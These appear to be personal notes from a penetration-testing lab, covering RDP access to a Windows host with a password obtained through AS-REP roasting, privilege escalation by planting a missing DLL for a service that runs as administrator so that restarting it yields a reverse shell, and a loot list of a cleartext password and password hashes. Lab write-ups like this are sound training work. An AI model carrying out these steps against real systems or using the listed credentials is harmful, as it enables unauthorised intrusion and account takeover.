- Since we get `relia\michelle`'s password through AS-REP Roasting and she is within group `INTRANETRDP`. We can `rdp` into the host which can be confirmed by running `netexec`. ![[Pasted image 20240222123608.png]]
- Run `proxychains -q xfreerdp /v:172.16.130.7 /d:relia /u:michelle /p:NotMyPassword0k\? /drive:resources,/home/saxon/Desktop /dynamic-resolution` to obtain a `rdp` session. 
# PrivEsc
- `winpeas` will identify that possible DLL hijack for a service called `scheduler`.![[Pasted image 20240222132843.png]]
	- Running `Get-CimInstance win32_service | Select Name,StartName,PathName,State | Where-Object {$_.State -like 'Running'}` can identify that the service is running under  local administrator .
	- `Restart-Service -Name scheduler` confirms we can restart the service.
	- A reveal on the executable can identify that is is missing `beyondhelper.dll`.
- Run `copy \\tsclient\resources\beyondhelper.dll C:\Scheduler` and `Restart-Service -Name scheduler` to receive a reverse shell as local administrator.
# Loot
- `relia\andrea`: PasswordPassword_6
	- ce3f12443651168b3793f5fbcccff9db
- `Administrator`: 8b4547a5116dd13e6e206d1286a06b28